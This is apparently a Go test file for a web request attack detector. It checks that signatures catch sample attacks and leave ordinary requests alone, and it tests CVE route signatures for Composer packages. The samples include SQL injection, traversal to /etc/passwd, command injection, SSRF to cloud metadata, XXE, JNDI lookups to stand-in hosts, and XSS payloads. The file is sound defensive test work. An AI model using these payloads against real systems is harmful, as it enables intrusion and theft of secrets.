package detect

import (
	"testing"

	"github.com/nt-neil/shentu/detect/sig"
)

// The embedded class signatures, each with requests it must catch and
// ordinary ones it must not. These are written with the signatures: the
// held-out evaluation (detect/testdata/holdout) is apart.
func TestClassSignatures(t *testing.T) {
	ss, err := sig.Load()
	if err != nil {
		t.Fatal(err)
	}
	m := NewMatcher(ss)
	hits := func(r AccessRecord) map[string]bool {
		out := map[string]bool{}
		for _, h := range m.Match(Normalize(r)).Hits {
			out[h.Signature] = true
		}
		return out
	}
	q := func(query string) AccessRecord { return AccessRecord{Method: "GET", Path: "/index.php", Query: query} }
	attacks := map[string][]AccessRecord{
		"sqli-tautology":            {q("id=1%27%20OR%20%271%27%3D%271"), q("user=admin%22%20or%20%22a%22=%22a")},
		"sqli-time-delay":           {q("id=1%20AND%20SLEEP(5)"), q("q=1';WAITFOR%20DELAY%20'0:0:5'--")},
		"sqli-catalog":              {q("id=1%20union%20select%20table_name%20from%20information_schema.tables")},
		"sqli-quote-comment":        {q("user=admin%27--%20"), q("id=1')%23")},
		"generic-sqli-union-select": {q("id=-1%20UNION%20ALL%20SELECT%201,2,3")},
		"path-sensitive-file":       {q("file=../../../../etc/passwd"), q("page=/proc/self/environ")},
		"path-php-wrapper":          {q("page=php://filter/convert.base64-encode/resource=index.php")},
		"path-traversal-in-path":    {{Method: "GET", Path: "/static/../../../etc/passwd"}},
		"cmdi-chained-command":      {q("host=127.0.0.1;id"), q("ip=8.8.8.8|cat%20/etc/passwd"), q("x=$(whoami)")},
		"cmdi-ifs":                  {q("cmd=cat${IFS}/etc/passwd")},
		"ssrf-metadata":             {q("url=http://169.254.169.254/latest/meta-data/")},
		"ssrf-scheme":               {q("url=gopher://127.0.0.1:6379/_INFO"), q("src=file:///etc/passwd")},
		"ssrf-loopback":             {q("url=http://127.0.0.1:8080/admin"), q("u=http://[::1]/")},
		"deser-php-object":          {q(`data=O:8:"stdClass":1:{s:1:"a";i:1;}`), q("f=phar://uploads/x.jpg")},
		"deser-java":                {q("obj=" + "rO0AB" + "XNyABFqYXZh")}, // a Java stream's public magic, base64: assembled so no scanner takes it for a key
		"xxe-doctype":               {q("xml=%3C!DOCTYPE%20x%20[%3C!ENTITY%20e%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E")},
		"code-template-arith":       {q("name={{7*7}}"), q("q=${7*7}"), q("n={{config.items()}}")},
		"code-eval-call":            {q("c=system('id')"), q("x=__import__('os').popen('id')")},
		"code-jndi-lookup":          {q("q=${jndi:ldap://x.example/a}"), q("q=${${lower:j}ndi:ldap://x/a}")},
		"code-jndi-lookup-header":   {{Method: "GET", Path: "/", UserAgent: "${jndi:ldap://x.example/a}"}},
		"xss-script":                {q("q=%3Cscript%3Ealert(1)%3C/script%3E"), q("q=%3Cimg%20src=x%20onerror=alert(1)%3E")},
		"scanner-user-agent":        {{Method: "GET", Path: "/", UserAgent: "sqlmap/1.8#stable (https://sqlmap.org)"}},
		"scanner-oob-host":          {q("url=http://abc123.oast.fun/")},
	}
	for id, rs := range attacks {
		for _, r := range rs {
			if !hits(r)[id] {
				t.Errorf("%s missed %s?%s (UA %q): %v", id, r.Path, r.Query, r.UserAgent, hits(r))
			}
		}
	}
	ordinary := []AccessRecord{
		q("s=select+a+plan+for+union+members"), q("q=it%27s+my+life"), q("q=O%27Reilly+books"),
		q("page=2&sort=price&order=asc"), q("redirect=/account/settings"), q("file=report-2026.pdf"),
		q("q=how+to+use+sleep+mode"), q("email=a.b%40example.com&name=Bob+Smith"), q("url=https://www.example.com/a?b=1"),
		q("q=50%25+off+%26+free+shipping"), q("tag=c%2B%2B"), q("q=%E4%B8%AD%E6%96%87"), q("id=12345"),
		q("comment=nice+post!+I+agree+--+John"), q("text=1+%2B+1+%3D+2"), q("q=cat+videos"),
		{Method: "GET", Path: "/wp-content/themes/a/style.css", Query: "ver=6.4.2"},
		{Method: "GET", Path: "/", UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"},
		{Method: "POST", Path: "/wp-admin/admin-ajax.php", Query: "action=heartbeat"},
	}
	for _, r := range ordinary {
		if h := hits(r); len(h) > 0 {
			t.Errorf("ordinary request %s?%s hit %v", r.Path, r.Query, h)
		}
	}
	if idx := sig.KEVIndex(ss); idx == nil {
		t.Error("no KEV index")
	}
}

// The Composer CVE signatures: each found on a host with the vulnerable
// version, none on one with the fixed.
func TestComposerCVESignatures(t *testing.T) {
	ss, err := sig.Load()
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		pkg, vuln, fixed, cve string
		req                   AccessRecord
		level                 string
	}{
		{"phpunit/phpunit", "5.6.2", "5.6.3", "CVE-2017-9841", AccessRecord{Method: "POST", Path: "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"}, LevelRoute},
		{"facade/ignition", "2.5.1", "2.5.2", "CVE-2021-3129", AccessRecord{Method: "POST", Path: "/_ignition/execute-solution"}, LevelRoute},
		{"flarum/core", "1.8.4", "1.8.5", "CVE-2024-21641", AccessRecord{Method: "GET", Path: "/logout", Query: "return=https%3A%2F%2Fevil.example%2F"}, LevelPayload},
	}
	m := NewMatcher(ss)
	for _, c := range cases {
		for _, v := range []string{c.vuln, c.fixed} {
			s := Build(nil, []PackageVuln{{Source: "/srv/composer.lock", Ecosystem: "Packagist", Package: c.pkg, Version: v, ID: c.cve}})
			g := NewJudge(s, ss).Judge(m.Match(Normalize(c.req)))
			want := 0
			if v == c.vuln {
				want = 1
			}
			if len(g.Candidates) != want || (want == 1 && g.Candidates[0].Level != c.level) {
				t.Errorf("%s %s: %+v, want %d candidate(s) at %s", c.cve, v, g, want, c.level)
			}
		}
	}
}
